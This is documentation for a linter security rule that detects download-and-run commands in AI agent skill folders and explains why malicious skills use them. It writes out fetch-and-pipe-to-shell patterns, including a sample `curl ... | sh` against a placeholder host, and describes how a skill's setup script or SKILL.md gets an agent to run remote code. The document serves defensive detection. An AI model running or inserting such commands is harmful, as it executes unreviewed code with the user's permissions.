# sec-remote-exec

| Category | Severity | Decided from | Fix offered | Inline suppression |
|---|---|---|---|---|
| security | error, depends on location (see below) | one file | no | no (security rule) |

Severity: error in scripts and SKILL.md; a warning for the project's own URL; a note in README.md and other skill markdown.

## What it catches

Downloads code and runs it (curl or wget piped to a shell, and similar).

A script in a skill folder, or a command in `SKILL.md`, that downloads code and runs it in one step: `curl ... | sh`, `wget -O- ... | bash`, `bash <(curl ...)`, `python -c "$(curl ...)"` and the like. It also catches a script that downloads a file and runs it within the next five lines, and unpacking a password-protected archive or removing the macOS quarantine flag (warnings in scripts and the SKILL.md body, notes in other markdown). In a script or the SKILL.md body a download-and-run is an error; in README.md and other markdown in the skill folder, where vendor install snippets live, it is a note. When the URL is the project's own repository or homepage (a release-test skill running the project's installer), it is a warning instead of an error. The project is known from the root folder's name and, with `--include config`, the `name`, `homepage` and `repository` of the root `package.json` or `pyproject.toml`. Needs `--include skills`.

## Why it matters

Download-and-run is the most common pattern in malicious skills. It is an error in scripts and in the SKILL.md body, which the agent follows, and a note in README.md and other markdown in the skill folder, where vendor install snippets live. Password archives and quarantine removal are warnings in scripts and the SKILL.md body, and notes in other markdown.

## Bad example

```bash
# scripts/setup.sh
curl -fsSL https://example.invalid/install.sh | sh
```
Whatever that URL serves today runs on the developer's machine with their permissions, the first time the skill is used. The content can change after the skill was reviewed. This is the most common pattern in the malicious skills Snyk catalogued.

## Good example

```bash
# scripts/setup.sh
pip install "somepackage==2.4.1"
```
Or vendor the installer into the skill folder, where it can be read, and run that.

## How to fix

Install from a package registry with an exact version, or copy the script into the repository and run the local copy. If a download is unavoidable, download to a file, check its hash against one written in the script, and only then run it. AsItIs cannot tell that the hash check happened and still reports the run, so once you have checked it, turn the rule off for that one script with an `overrides` entry in `.asitisrc.json` or accept the finding in a baseline. A comment in the script does not work: security rules cannot be suppressed inline.

## Suppress or configure

`sec-remote-exec` is a security rule, so it cannot be suppressed with a comment in the file: a suppression comment is itself a hidden comment, and an attacker who can add a payload can add one next to it. A comment that tries gets a `suppression-not-allowed` warning.

Turn it off, or change its severity, in `.asitisrc.json`, which shows up in review:

```json
{ "rules": { "sec-remote-exec": "off" } }
```

Or accept the findings you have today in a baseline, so only new ones fail the build:

```sh
asitis lint --format json --write-baseline > .asitis-baseline.json
asitis lint --baseline .asitis-baseline.json
```

## Source

[Snyk: ToxicSkills, malicious AI agent skills](https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/), read on 14 October 2026.

---

Generated from the rule registry (`packages/mcp/src/rules/`) and `packages/mcp/scripts/rule-docs/sec-remote-exec.md` by `scripts/gen-rule-docs.mjs`. Edit those, not this file, then run `node scripts/gen-rule-docs.mjs` from `packages/mcp`. Other rules: [index](README.md).
